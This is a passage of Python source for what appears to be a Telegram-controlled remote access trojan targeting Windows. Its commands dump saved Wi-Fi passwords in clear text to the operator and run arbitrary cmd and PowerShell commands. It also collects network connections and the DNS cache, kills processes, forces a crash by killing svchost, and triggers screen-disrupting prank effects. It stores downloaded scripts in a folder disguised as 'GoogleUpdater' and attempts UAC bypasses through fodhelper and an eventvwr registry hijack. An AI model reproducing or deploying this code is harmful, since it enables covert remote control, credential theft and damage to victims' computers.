    else:
        bot.reply_to(message, "✅ Sound is already enabled")


# Обработчик для команды !microlist
@bot.message_handler(func=lambda message: message.text.startswith('!Microlist'))
def microlist(message):
    """List available microphones, removing duplicates and irrelevant names."""
    p = pyaudio.PyAudio()

    # Get a list of all available microphones
    mic_list = []
    for i in range(p.get_device_count()):
        info = p.get_device_info_by_index(i)
        if info.get('maxInputChannels') > 0:
            mic_name = info.get('name')

            # Filter out invalid or corrupted names
            if is_valid_microphone_name(mic_name):
                mic_list.append(mic_name)

    # Remove duplicates by converting the list to a set and back to a list
    unique_mic_list = list(set(mic_list))

    if unique_mic_list:
        # Format the output message with a header and list of microphones
        formatted_mic_list = "\n".join(unique_mic_list)
        bot.reply_to(message, f"🎤 Available microphones:\n{formatted_mic_list}")
    else:
        bot.reply_to(message, "No valid microphones found.")

def is_valid_microphone_name(name):
    """Filters out invalid or corrupted microphone names."""
    # List of invalid keywords that might indicate corrupted names
    invalid_keywords = [
        "РџРµСЂРІРёС‡РЅС‹Р№", "РґСЂР°Р№РІРµСЂ", "Р·Р°РїРёСЃРё", "Р·РІСѓРєР°", 
        "РџРµСЂРµН", "Input", "Проверьте", "System", "Default", "Unknown"
    ]

    # Check if any invalid keyword is in the name (case insensitive)
    for keyword in invalid_keywords:
        if keyword.lower() in name.lower():
            return False
    return True

# Обработчик для команды !ping
@bot.message_handler(func=lambda message: message.text.startswith('!ping'))
def ping(message):
    site = message.text.split()[1] if len(message.text.split()) > 1 else ""
    if not site:
        bot.reply_to(message, "❌ Please provide a site, e.g. !ping google.com")
        return

    try:
        result = subprocess.run(["ping", "-n", "4", site], capture_output=True, text=True, encoding="cp866", errors="ignore")
        output = result.stdout if result.stdout else result.stderr
        bot.reply_to(message, f"```{output[:1900]}```")
    except Exception as e:
        bot.reply_to(message, f"❌Error: {e}")

# Обработчик для команды !packet
@bot.message_handler(func=lambda message: message.text.startswith('!packet'))
def packet(message):
    try:
        parts = message.text.split()
        if len(parts) != 4:
            bot.reply_to(message, "❌ **Incorrect!** Try: `!packet <site> <packets> <strength>`\n\n**True:**\n`!packet google.com 10 64`\n`!packet 8.8.8.8 5 128`")
            return
        
        site = parts[1]
        packets = int(parts[2])
        strength = int(parts[3])

        result = subprocess.run(["ping", "-n", str(packets), "-l", str(strength), site], capture_output=True, text=True, encoding="cp866", errors="ignore")
        output = result.stdout if result.stdout else result.stderr
        
        sent_packets = len(re.findall(r'Ответ от', output))
        lost_packets = len(re.findall(r'Превышен интервал ожидания', output))
        
        detailed_output = (
            f"📡 **Ping results for {site}:**\n"
            f"🔹 **Sent Packets:** {sent_packets} / {packets}\n"
            f"❌ **Lost Packets:** {lost_packets}\n"
            f"💥 **Packet Strength:** {strength} bytes\n"
            f"📊 **Full Output:**\n```{output[:1500]}```"
        )
        bot.reply_to(message, detailed_output)
    except subprocess.TimeoutExpired:
        bot.reply_to(message, "✅ Packets sent, but response timeout expired.")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")

# Обработчик для команды !netinfo
@bot.message_handler(func=lambda message: message.text.startswith('!netinfo'))
def netinfo(message):
    try:
        local_ip_output = subprocess.run("ipconfig | findstr IPv4", shell=True, capture_output=True, text=True, encoding="cp866", errors="ignore").stdout
        public_ip_output = subprocess.run("nslookup myip.opendns.com resolver1.opendns.com", shell=True, capture_output=True, text=True, encoding="cp866", errors="ignore").stdout
        netstat_output = subprocess.run("netstat -ano", shell=True, capture_output=True, text=True, encoding="cp866", errors="ignore").stdout
        dns_cache_output = subprocess.run("ipconfig /displaydns", shell=True, capture_output=True, text=True, encoding="cp866", errors="ignore").stdout

        local_ips = re.findall(r'\d+\.\d+\.\d+\.\d+', local_ip_output)
        public_ips = re.findall(r'\d+\.\d+\.\d+\.\d+', public_ip_output)
        netstat_lines = netstat_output.splitlines()[:10]  # Ограничение вывода
        dns_cache_lines = dns_cache_output.splitlines()[:10]  # Ограничение вывода

        output = (
            f"Local IPs:\n" + "\n".join(local_ips) +
            f"\n\nPublic IPs:\n" + "\n".join(public_ips) +
            f"\n\nConnections:\n" + "\n".join(netstat_lines) +
            f"\n\nLast DNS connections:\n" + "\n".join(dns_cache_lines)
        )

        bot.reply_to(message, f"```{output[:1900]}```")
    except Exception as e:
        bot.reply_to(message, f"Ошибка: {e}")

# Обработчик для команды !wifipass
@bot.message_handler(func=lambda message: message.text.startswith('!wifipass'))
def wifipass(message):
    try:
        password_info = ""

        # Метод 1: Netsh
        try:
            result = subprocess.run("chcp 65001 & netsh wlan show profiles", shell=True, capture_output=True, text=True, encoding="utf-8", errors="ignore")
            profiles = re.findall(r"Все профили пользователей\s*:\s*(.+)", result.stdout)
            
            if profiles:
                for profile in profiles:
                    profile = profile.strip()
                    profile_info = subprocess.run(f'chcp 65001 & netsh wlan show profile name="{profile}" key=clear', shell=True, capture_output=True, text=True, encoding="utf-8", errors="ignore").stdout
                    password_match = re.search(r"Содержимое ключа\s*:\s*(.+)", profile_info)
                    password = password_match.group(1).strip() if password_match else "🔒 Нет пароля"
                    password_info += f"🛜 {profile}\n🔓 {password}\n\n"
        except Exception as e:
            password_info += f"⚠ Ошибка netsh: {e}\n\n"

        # Метод 2: Чтение из реестра (если возможно)
        try:
            key_path = r"SOFTWARE\Microsoft\WlanSvc\Interfaces"
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path) as key:
                for i in range(winreg.QueryInfoKey(key)[0]):
                    iface_name = winreg.EnumKey(key, i)
                    subkey_path = f"{key_path}\\{iface_name}\\Profiles"
                    try:
                        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, subkey_path) as subkey:
                            for j in range(winreg.QueryInfoKey(subkey)[0]):
                                wifi_name = winreg.EnumKey(subkey, j)
                                password_info += f"🛜 {wifi_name} (из реестра)\n🔓 Неизвестно\n\n"
                    except FileNotFoundError:
                        pass
        except Exception as e:
            password_info += f"⚠ Ошибка реестра: {e}\n\n"

        # Метод 3: PowerShell (альтернативный способ)
        try:
            powershell_script = "(netsh wlan show profile) | ForEach-Object {$_ -match 'Все профили пользователей\\s*:\\s*(.+)' | Out-Null; $matches[1] }"
            result = subprocess.run(["powershell", "-Command", powershell_script], capture_output=True, text=True)
            profiles_ps = result.stdout.strip().split("\n")
            for profile in profiles_ps:
                profile = profile.strip()
                if profile:
                    profile_info = subprocess.run(["powershell", "-Command", f"netsh wlan show profile name='{profile}' key=clear"], capture_output=True, text=True)
                    password_match = re.search(r"Содержимое ключа\s*:\s*(.+)", profile_info.stdout)
                    password = password_match.group(1).strip() if password_match else "🔒 Нет пароля"
                    password_info += f"🛜 {profile} (PowerShell)\n🔓 {password}\n\n"
        except Exception as e:
            password_info += f"⚠ Ошибка PowerShell: {e}\n\n"

        # Проверка, есть ли пароли
        if not password_info.strip():
            bot.reply_to(message, "❌ No saved WIFI found.")
            return

        bot.reply_to(message, f"🔑 WiFi Passwords:\n\n{password_info.strip()}")

    except Exception as e:
        bot.reply_to(message, f"❌ ERROR: {e}")

@bot.message_handler(commands=['wallpaper'])
def set_wallpaper(message):
    """Устанавливает обои на рабочий стол по URL."""
    try:
        # Получаем URL из сообщения
        url = message.text.split()[1] if len(message.text.split()) > 1 else None
        if not url:
            bot.reply_to(message, "❌ Please provide a URL!")
            return

        path = os.path.join(os.getenv("TEMP"), "wallpaper.bmp")  # Windows принимает BMP

        # Загружаем изображение
        response = requests.get(url, stream=True)
        if response.status_code != 200:
            bot.reply_to(message, "❌ Error when getting image!")
            return

        img = Image.open(io.BytesIO(response.content))

        # Конвертируем в BMP, если формат не поддерживается напрямую
        img = img.convert("RGB")
        img.save(path, "BMP")

        # Устанавливаем как обои
        ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
        bot.reply_to(message, "✅ Wallpaper changed!")

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")

#-memz

effects_running = False

# Chaotic mouse movement
def move_mouse():
    while effects_running:
        x, y = pyautogui.position()
        pyautogui.moveTo(x + random.randint(-50, 50), y + random.randint(-50, 50), duration=0.1)
        time.sleep(0.1)

# Random error messages
def error_spam():
    while effects_running:
        ctypes.windll.user32.MessageBoxW(0, "MEMZ ERROR!", "Critical Error", 0x10)
        time.sleep(random.uniform(2, 5))

# Fullscreen screen distortion using screenshots
def glitch_screen():
    pygame.init()
    screen = pygame.display.set_mode(pyautogui.size(), pygame.NOFRAME)
    while effects_running:
        img = pyautogui.screenshot()
        img = img.resize(pyautogui.size())
        img = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
        img = cv2.applyColorMap(img, cv2.COLORMAP_JET)  # Color distortion
        img = pygame.image.frombuffer(img.tobytes(), pyautogui.size(), "RGB")
        screen.blit(img, (random.randint(-20, 20), random.randint(-20, 20)))
        pygame.display.update()
        pygame.event.pump()  # Fix for pygame freezing
        time.sleep(0.1)
    pygame.quit()

# Floating Windows icons following the cursor
def floating_icons():
    icons = [
        "C:\\Windows\\System32\\shell32.dll,128",
        "C:\\Windows\\System32\\shell32.dll,237",
        "C:\\Windows\\System32\\shell32.dll,50"
    ]
    while effects_running:
        x, y = pyautogui.position()
        icon = random.choice(icons)
        os.system(f"powershell Start-Process 'explorer.exe' -ArgumentList '/select,{icon}'")
        time.sleep(1)

# Keyboard listener to stop effects when M+Z is pressed
def key_listener(ctx):
    global effects_running
    while effects_running:
        if keyboard.is_pressed("m") and keyboard.is_pressed("z"):
            effects_running = False
            bot.loop.call_soon_threadsafe(asyncio.create_task, ctx.send("🔓 Break Code `M+Z` Pressed! Stopped the MEMZ"))
            break
        time.sleep(0.1)

# MEMZ command to start/stop effects
@bot.message_handler(func=lambda message: message.text.startswith("!memz"))
def memz_command(message):
    global effects_running
    mode = message.text.split()[1] if len(message.text.split()) > 1 else None
    if mode == "on" and not effects_running:
        effects_running = True
        bot.reply_to(message, "✅ MEMZ enabled!")
        threading.Thread(target=move_mouse, daemon=True).start()
        threading.Thread(target=error_spam, daemon=True).start()
        threading.Thread(target=glitch_screen, daemon=True).start()
        threading.Thread(target=floating_icons, daemon=True).start()
        threading.Thread(target=key_listener, args=(message,), daemon=True).start()
    elif mode == "off" and effects_running:
        effects_running = False
        bot.reply_to(message, "⚙️ MEMZ Disabled 🔄")
    else:
        bot.reply_to(message, "⚠️ Use !memz **on/off**")

#-memz

# Функция для включения инвертирования цветов
async def enable_color_invert():
    try:
        # Включаем инвертирование цветов через реестр
        subprocess.run([
            'reg', 'add', r'HKCU\Software\Microsoft\Windows\CurrentVersion\ColorFilters',
            '/v', 'Enable', '/t', 'REG_DWORD', '/d', '1', '/f'
        ], check=True)
        subprocess.run([
            'reg', 'add', r'HKCU\Software\Microsoft\Windows\CurrentVersion\ColorFilters',
            '/v', 'Filter', '/t', 'REG_DWORD', '/d', '1', '/f'
        ], check=True)

        # Перезапускаем проводник Windows, чтобы изменения вступили в силу
        subprocess.run(['taskkill', '/F', '/IM', 'explorer.exe'], check=True)
        subprocess.run(['start', 'explorer.exe'], check=True)

        return "✅ Цветовой фильтр включен и экран инвертирован."
    except subprocess.CalledProcessError as e:
        return f"❌ Ошибка при активации цветового фильтра: {e}"

# Функция для выключения инвертирования цветов
async def disable_color_invert():
    try:
        # Отключаем инвертирование цветов
        subprocess.run([
            'reg', 'add', r'HKCU\Software\Microsoft\Windows\CurrentVersion\ColorFilters',
            '/v', 'Enable', '/t', 'REG_DWORD', '/d', '0', '/f'
        ], check=True)

        # Перезапускаем проводник Windows, чтобы изменения вступили в силу
        subprocess.run(['taskkill', '/F', '/IM', 'explorer.exe'], check=True)
        subprocess.run(['start', 'explorer.exe'], check=True)

        return "✅ Цветовой фильтр отключен."
    except subprocess.CalledProcessError as e:
        return f"❌ Ошибка при отключении цветового фильтра: {e}"

# Команда для инвертирования цветов
@bot.message_handler(func=lambda message: message.text.startswith("!invert"))
def handle_invert(message):
    # Проверка на правильность команды
    command = message.text.split()
    if len(command) != 2 or command[1] not in ["on", "off"]:
        bot.send_message(message.chat.id, "❌ Неверная команда! Используйте !invert on для включения и !invert off для отключения.")
        return
    
    if command[1] == "on":
        bot.send_message(message.chat.id, "🔄 Включение инвертирования цветов экрана... Пожалуйста, подождите.")
        result = enable_color_invert()  # Важно вызвать функцию
        bot.send_message(message.chat.id, result)
    elif command[1] == "off":
        bot.send_message(message.chat.id, "🔄 Отключение инвертирования цветов экрана... Пожалуйста, подождите.")
        result = disable_color_invert()  # Важно вызвать функцию
        bot.send_message(message.chat.id, result)

#FLIP

appdata_path = os.getenv("APPDATA")
scripts_dir = os.path.join(appdata_path, "GoogleUpdater", "files")

# Файлы для загрузки
ps1_url = "https://raw.githubusercontent.com/Clicketyclick/ChangeScreenOrientation/refs/heads/master/ChangeOrientation.ps1"
cmd_url = "https://raw.githubusercontent.com/Clicketyclick/ChangeScreenOrientation/refs/heads/master/co.cmd"

ps1_file = os.path.join(scripts_dir, "ChangeOrientation.ps1")
cmd_file = os.path.join(scripts_dir, "co.cmd")

# Функция для загрузки файлов
def download_file(url, dest_path):
    urllib.request.urlretrieve(url, dest_path)

# Проверка наличия файлов
def check_files():
    return os.path.exists(ps1_file) and os.path.exists(cmd_file)

# Команда для установки файлов и отображения статуса
@bot.message_handler(func=lambda message: message.text.startswith("!flipinstall"))
def install(message):
    if not check_files():
        bot.send_message(message.chat.id, "📥 Загружаем и устанавливаем необходимые файлы...")

        if not os.path.exists(scripts_dir):
            os.makedirs(scripts_dir)

        download_file(ps1_url, ps1_file)
        download_file(cmd_url, cmd_file)

        bot.send_message(message.chat.id, "✅ Файлы загружены!\n🔧 Устанавливаем и настраиваем...")

        time.sleep(2)

        if check_files():
            bot.send_message(message.chat.id, "✅ Установка завершена! Программы готовы к использованию.")
        else:
            bot.send_message(message.chat.id, "❌ Ошибка при установке файлов.")
    else:
        bot.send_message(message.chat.id, "✅ Файлы уже установлены.")

# Команда для изменения ориентации экрана
@bot.message_handler(func=lambda message: message.text.startswith("!flipscreen"))
def flipscreen(message):
    # Проверяем, есть ли аргумент в команде
    if len(message.text.split()) < 2:
        bot.send_message(message.chat.id, "❌ !flipinstall не забудь. Используйте команду в формате: !flipscreen <direction>")
        return

    direction = message.text.split()[1]
    valid_directions = ['right', 'left', 'down', 'up', 'reset', 'reverse-portrait', 'reverse-landscape']
    
    if direction not in valid_directions:
        bot.send_message(message.chat.id, f"❌ Неверное направление. Доступные направления: {', '.join(valid_directions)}.")
        return

    # Если файлы не установлены, то сначала вызываем установку
    if not check_files():
        bot.send_message(message.chat.id, "🔧 Программы еще не установлены. Начинаю установку...")
        install(message)  # Запускаем установку
        bot.send_message(message.chat.id, "🖥 После установки экран не будет вращаться автоматически.\nПожалуйста, запустите команду снова.")
        return

    # Если файлы есть, выполняем команду вращения экрана
    if direction == 'right':
        bot.send_message(message.chat.id, "🔄 right.")
        subprocess.run([cmd_file, 'right'], check=True)
    elif direction == 'left':
        bot.send_message(message.chat.id, "🔄 left.")
        subprocess.run([cmd_file, 'left'], check=True)
    elif direction == 'down':
        bot.send_message(message.chat.id, "🔄 down.")
        subprocess.run([cmd_file, 'down'], check=True)
    elif direction == 'up':
        bot.send_message(message.chat.id, "🔄 up.")
        subprocess.run([cmd_file, 'up'], check=True)
    elif direction == 'reset':
        bot.send_message(message.chat.id, "🔄 resetted.")
        subprocess.run([cmd_file, 'reset'], check=True)
    elif direction == 'reverse-portrait':
        bot.send_message(message.chat.id, "🔄 reverse-portrait.")
        subprocess.run([cmd_file, 'reverse-portrait'], check=True)
    elif direction == 'reverse-landscape':
        bot.send_message(message.chat.id, "🔄 reverse-landscape.")
        subprocess.run([cmd_file, 'reverse-landscape'], check=True)

#FLIP

@bot.message_handler(func=lambda message: message.text.startswith("!cd"))
def cd(message):
    # Действие по умолчанию - открыть
    action = message.text.split()[1].lower() if len(message.text.split()) > 1 else "open"
    
    def get_cd_drives():
        """Возвращает список доступных CD/DVD приводов."""
        drives = []
        bitmask = win32api.GetLogicalDrives()
        for letter in range(26):  # A-Z
            if bitmask & (1 << letter):
                drive = f"{chr(65 + letter)}:\\"
                if win32file.GetDriveType(drive) == win32con.DRIVE_CDROM:
                    drives.append(drive)
        return drives

    def open_tray():
        """Пытается открыть все обнаруженные CD-приводы."""
        success = False
        drives = get_cd_drives()

        for drive in drives:
            try:
                subprocess.run(f"powershell -Command (New-Object -ComObject Shell.Application).Namespace(17).ParseName('{drive}').InvokeVerb('Eject')", check=True)
                success = True
            except:
                pass

            try:
                ctypes.windll.winmm.mciSendStringW(f"set cdaudio door open", None, 0, None)
                success = True
            except:
                pass

        return success

    def close_tray():
        """Пытается закрыть все обнаруженные CD-приводы."""
        success = False
        drives = get_cd_drives()

        for drive in drives:
            try:
                ctypes.windll.winmm.mciSendStringW(f"set cdaudio door closed", None, 0, None)
                success = True
            except:
                pass

        return success

    # Выполнение действия
    if action == "open":
        if open_tray():
            bot.send_message(message.chat.id, "✅ CD tray opened.")
        else:
            bot.send_message(message.chat.id, "❌ Failed to open CD tray.")
    elif action == "close":
        if close_tray():
            bot.send_message(message.chat.id, "✅ CD tray closed.")
        else:
            bot.send_message(message.chat.id, "❌ Failed to close CD tray.")
    else:
        bot.send_message(message.chat.id, "❌ Use: `!cd open` or `!cd close`.")

@bot.message_handler(func=lambda message: message.text.startswith("!rickroll"))
def rickroll(message):

    try:
        bot.send_message(message.chat.id, "🔄 downloading rickroll...")
        rickroll_url = "https://www.myinstants.com/media/sounds/rickroll.mp3"
        local_path = os.path.join(VIDEO_PATH, "rickroll.mp3")

        response = requests.get(rickroll_url)
        with open(local_path, "wb") as f:
            f.write(response.content)

        bot.send_message(message.chat.id, "🎵 Rickrolling...")
        pygame.mixer.init()
        pygame.mixer.music.load(local_path)
        pygame.mixer.music.play()

        # Ожидание завершения трека
        while pygame.mixer.music.get_busy():
            asyncio.sleep(1)

        pygame.mixer.quit()
        os.remove(local_path)  # Удаляем файл после воспроизведения
        bot.send_message(message.chat.id, "✅ RickRolled!")

    except Exception as e:
        bot.send_message(message.chat.id, f"❌ ERROR: {e}")

# Команда для TTS
@bot.message_handler(func=lambda message: message.text.startswith("!tts"))
def tts(message):
    try:
        args = message.text.split(" ", 3)
        if len(args) < 4:
            bot.send_message(message.chat.id, "❌ Missing text argument!")
            return

        speed = int(args[1]) if len(args) > 1 else 400
        pitch = int(args[2]) if len(args) > 2 else 0
        text = args[3]

        # Инициализация COM для pyttsx3
        ctypes.windll.Ole32.CoInitialize(None)  # Инициализация COM библиотеки

        engine = pyttsx3.init()

        # Максимальная скорость
        engine.setProperty('rate', min(speed, 999))  # Ограничиваем, чтобы не было слишком быстро

        # Попытка изменить голос (для повышения высоты тона)
        voices = engine.getProperty('voices')
        if pitch < len(voices):  
            engine.setProperty('voice', voices[pitch].id)
        
        engine.say(text)
        engine.runAndWait()

        bot.send_message(message.chat.id, f"🔊 TTS Played at {speed} speed with pitch {pitch}.")

    except Exception as e:
        bot.send_message(message.chat.id, f"❌ ERROR: {e}")

# Команда для воспроизведения звука из URL
@bot.message_handler(func=lambda message: message.text.startswith("!sound"))
def sound(message):
    try:
        args = message.text.split(" ", 1)
        if len(args) < 2:
            bot.send_message(message.chat.id, "❌ Missing URL argument!")
            return
        
        url = args[1]  # Берем URL из аргументов
        bot.send_message(message.chat.id, "🔄 Downloading audio...")

        if not os.path.exists(VIDEO_PATH):  # Создаем папку, если её нет
            os.makedirs(VIDEO_PATH)

        file_name = url.split("/")[-1]
        local_path = os.path.join(VIDEO_PATH, file_name)

        response = requests.get(url)
        with open(local_path, "wb") as f:
            f.write(response.content)

        bot.send_message(message.chat.id, f"🎵 Playing {file_name}...")

        pygame.mixer.init()
        pygame.mixer.music.load(local_path)
        pygame.mixer.music.play()

        # Ожидание завершения трека
        while pygame.mixer.music.get_busy():
            pygame.time.delay(100)

        pygame.mixer.quit()
        os.remove(local_path)  # Удаляем файл после воспроизведения
        bot.send_message(message.chat.id, "✅ Sound played!")

    except Exception as e:
        bot.send_message(message.chat.id, f"❌ ERROR: {e}")



shake_active = False

@bot.message_handler(func=lambda message: message.text.startswith("!shake"))
def shake(message):
    global shake_active

    # Разбор команды
    parts = message.text.split()
    
    if len(parts) < 3:
        bot.send_message(message.chat.id, "❌ Use: `!shake <intensity> on` или `!shake <intensity> off`")
        return
    
    try:
        intensity = int(parts[1])
        state = parts[2].lower()
    except ValueError:
        bot.send_message(message.chat.id, "❌ Invalid intensity value. It should be an integer.")
        return

    if state == "on":
        if shake_active:
            return bot.send_message(message.chat.id, "🔄 Cursor shaking already!")

        shake_active = True
        bot.send_message(message.chat.id, f"🔄 Cursor shaking with intensity: {intensity}")

        def shake_mouse():
            while shake_active:
                x, y = pyautogui.position()
                pyautogui.moveTo(
                    x + random.randint(-intensity, intensity), 
                    y + random.randint(-intensity, intensity), 
                    duration=0.05
                )
                time.sleep(0.05)

        threading.Thread(target=shake_mouse, daemon=True).start()

    elif state == "off":
        if not shake_active:
            return bot.send_message(message.chat.id, "✅ Shake already stopped!")

        shake_active = False
        bot.send_message(message.chat.id, "✅ Shake stopped!")

    else:
        bot.send_message(message.chat.id, "❌ Use: `!shake <intensity> on` или `!shake <intensity> off`")

@bot.message_handler(func=lambda message: message.text.startswith("!volume"))
def volume(message):
    try:
        # Извлекаем уровень громкости из команды
        parts = message.text.split()
        if len(parts) != 2:
            return bot.send_message(message.chat.id, "❌ Please provide a volume level (0-100).")
        
        level = int(parts[1])

        if 0 <= level <= 100:
            devices = AudioUtilities.GetSpeakers()
            interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
            volume_control = cast(interface, POINTER(IAudioEndpointVolume))

            volume_control.SetMasterVolumeLevelScalar(level / 100, None)
            bot.send_message(message.chat.id, f"Громкость установлена на {level}%")
        else:
            bot.send_message(message.chat.id, "❌ Volume level must be between 0 and 100.")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {e}")

@bot.message_handler(func=lambda message: message.text.startswith("!tasklist"))
def tasklist(message):
    try:
        processes = list(psutil.process_iter(attrs=['pid', 'name']))
        open_windows = gw.getWindowsWithTitle('')
        visible_processes = [p for p in processes if any(p.info['name'].lower() in w.title.lower() for w in open_windows)]
        background_processes = [p for p in processes if p not in visible_processes]
        random_bg_processes = random.sample(background_processes, min(len(background_processes), 20))

        tasklist_text = "--- Active Windows ---\n"
        for p in visible_processes[:20]:
            tasklist_text += f"🔹 {p.info['name']} (PID: {p.info['pid']})\n"

        tasklist_text += "\n--- Author: @Ewinnery ---\n"
        for p in random_bg_processes:
            tasklist_text += f"🔸 {p.info['name']} (PID: {p.info['pid']})\n"

        bot.send_message(message.chat.id, f"```{tasklist_text}```")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {e}")

@bot.message_handler(func=lambda message: message.text.startswith("!taskkill"))
def taskkill(message):
    try:
        parts = message.text.split()
        if len(parts) < 2:
            return bot.send_message(message.chat.id, "❌ Please specify the process name to kill.")
        
        name = parts[1]
        result = subprocess.run(["taskkill", "/F", "/IM", name], capture_output=True, text=True)

        if "SUCCESS" in result.stdout:
            bot.send_message(message.chat.id, f"💀 {name} Killed!")
        else:
            bot.send_message(message.chat.id, f"💀 Failed to kill {name}.")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {e}")

@bot.message_handler(func=lambda message: message.text.startswith("!taskmake"))
def taskmake(message):
    try:
        parts = message.text.split(" ", 1)
        if len(parts) < 2:
            return bot.send_message(message.chat.id, "❌ Please provide a task to start.")
        
        task = parts[1]
        result = subprocess.run([task], shell=True, capture_output=True, text=True, encoding="cp866", errors="ignore")

        if result.returncode == 0:
            bot.send_message(message.chat.id, f"✅ `{task}` Started.")
        else:
            bot.send_message(message.chat.id, f"❌ Error `{task}`: {result.stderr}")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {e}")

@bot.message_handler(func=lambda message: message.text.startswith("!powershell"))
def powershell(message):
    try:
        parts = message.text.split(" ", 1)
        if len(parts) < 2:
            return bot.send_message(message.chat.id, "❌ Please provide a command to run.")

        command = parts[1]
        result = subprocess.run(["powershell", "-Command", command], capture_output=True, text=True, encoding="cp866", errors="ignore")
        output = result.stdout if result.stdout else result.stderr

        if not output:
            output = "No output from command"

        bot.send_message(message.chat.id, f"```{output[:1900]}```")  # Ограничение по длине сообщения
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {e}")

@bot.message_handler(func=lambda message: message.text.startswith("!cmd"))
def cmd(message):
    try:
        # Извлекаем команду
        parts = message.text.split(" ", 1)
        if len(parts) < 2:
            return bot.send_message(message.chat.id, "❌ Please provide a command to run.")

        command = parts[1]

        # Если система Windows, меняем команду 'ls' на 'dir'
        if os.name == "nt":
            command = command.strip()
            if command == "ls":
                command = "dir"
        
        # Выполняем команду с правильной кодировкой
        result = subprocess.run(command, shell=True, capture_output=True, text=True, encoding="cp866", errors="ignore")
        output = result.stdout if result.stdout else result.stderr

        if not output:
            output = "No output from command"

        bot.send_message(message.chat.id, f"```{output[:1900]}```")  # Ограничение по длине сообщения
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {e}")

@bot.message_handler(commands=['bsod'])
def bsod(message):
    """Вызывает синий экран смерти (BSOD)."""
    try:
        if ctypes.windll.shell32.IsUserAnAdmin():
            bot.send_message(message.chat.id, "💀 Вызываю BSOD...")
            subprocess.run("taskkill /IM svchost.exe /F", shell=True)  # Прерывание критического процесса
        else:
            bot.send_message(message.chat.id, "❌ Нужно быть администратором для вызова BSOD!")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Ошибка: {e}")

@bot.message_handler(func=lambda message: message.text.startswith('!checkadmin'))
def checkadmin(message):
    checks = []
    
    # Проверка через net session
    try:
        result = subprocess.run("net session", shell=True, capture_output=True, text=True, encoding="cp866", errors="ignore")
        if result.returncode == 0:
            checks.append("✅ Net session: Admin rights confirmed.")
        else:
            checks.append("❌ Net session: No admin rights.")
    except:
        checks.append("❌ Net session: Error running command.")
    
    # Проверка записи в системную папку
    try:
        test_path = "C:\\Windows\\Temp\\test_admin.txt"
        with open(test_path, "w") as f:
            f.write("admin_check")
        os.remove(test_path)
        checks.append("✅ File write test: Admin rights confirmed.")
    except:
        checks.append("❌ File write test: No admin rights.")
    
    # Проверка через whoami /priv
    try:
        result = subprocess.run("whoami /priv", shell=True, capture_output=True, text=True, encoding="cp866", errors="ignore")
        if "SeShutdownPrivilege" in result.stdout:
            checks.append("✅ Whoami priv: Admin rights confirmed.")
        else:
            checks.append("❌ Whoami priv: No admin rights.")
    except:
        checks.append("❌ Whoami priv: Error running command.")
    
    # Проверка чтения реестра с админ-правами
    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion", 0, winreg.KEY_READ) as key:
            checks.append("✅ Registry read: Admin rights confirmed.")
    except:
        checks.append("❌ Registry read: No admin rights.")
    
    # Проверка выполнения fsutil (только админ может)
    try:
        result = subprocess.run("fsutil dirty query C:", shell=True, capture_output=True, text=True, encoding="cp866", errors="ignore")
        if "is NOT Dirty" in result.stdout or "is Dirty" in result.stdout:
            checks.append("✅ Fsutil: Admin rights confirmed.")
        else:
            checks.append("❌ Fsutil: No admin rights.")
    except:
        checks.append("❌ Fsutil: Error running command.")
    
    bot.reply_to(message, "\n".join(checks))

@bot.message_handler(func=lambda message: message.text.startswith('!admin'))
def admin(message):
    args = message.text.split()
    
    if len(args) != 4:
        bot.reply_to(message, "❌ Incorrect command usage! Use: !admin <title> <icon_url> <method>")
        return
    
    title, icon_url, method = args[1], args[2], args[3]
    
    # Проверка формата иконки
    if not icon_url.endswith(('.png', '.ico', '.jpg', '.jpeg')):
        bot.reply_to(message, "❌ Unsupported icon format! Supported formats: .png, .ico, .jpg, .jpeg")
        return
    
    methods = ["uac", "schtask", "bypass", "eventvwr", "slui", "silent"]
    if method not in methods:
        bot.reply_to(message, f"❌ Unsupported method! Supported methods: {', '.join(methods)}")
        return
    
    script = ""
    
    # Подготовка скрипта для каждого метода
    if method == "uac":
        script = 'Start-Process -FilePath "powershell" -ArgumentList "-Command Start-Process powershell -Verb runAs"'
    elif method == "schtask":
        script = f'Schtasks /Create /TN "{title}" /TR "powershell -Command Start-Process powershell -Verb runAs" /SC ONCE /ST 00:00 /RL HIGHEST & Schtasks /Run /TN "{title}"'
    elif method == "bypass":
        script = 'Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"'
    elif method == "eventvwr":
        try:
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\\Classes\\mscfile\\shell\\open\\command"
            winreg.CreateKey(key, subkey)
            registry_key = winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE)
            winreg.SetValueEx(registry_key, None, 0, winreg.REG_SZ, f'cmd.exe /k powershell -Command Start-Process powershell -Verb runAs')
            winreg.CloseKey(registry_key)
            script = 'Start-Process -FilePath "eventvwr.exe"'
        except Exception as e:
            bot.reply_to(message, f"❌ Failed to modify registry: {e}")
            return
    elif method == "slui":
        script = 'Start-Process -FilePath "C:\\Windows\\System32\\slui.exe"'
    elif method == "silent":
        script = '''
        $obj = New-Object -ComObject Shell.Application;
        $obj.ShellExecute("powershell", "-Command Start-Process powershell -Verb runAs", "", "runas", 1);
        '''
    
    try:
        subprocess.run(["powershell", "-Command", script], shell=True)
        bot.reply_to(message, f"✅ Admin rights requested using method: {method}\nTitle: {title}, Icon: {icon_url}")
    except Exception as e:
        bot.reply_to(message, f"❌ Failed to request admin rights: {e}")

@bot.message_handler(func=lambda message: message.text.startswith('!legitadmin'))
def legitadmin(message):
    # Проверяем, что команда пришла от авторизованного канала

    # Проверяем, запущен ли бот с правами администратора
    if not ctypes.windll.shell32.IsUserAnAdmin():
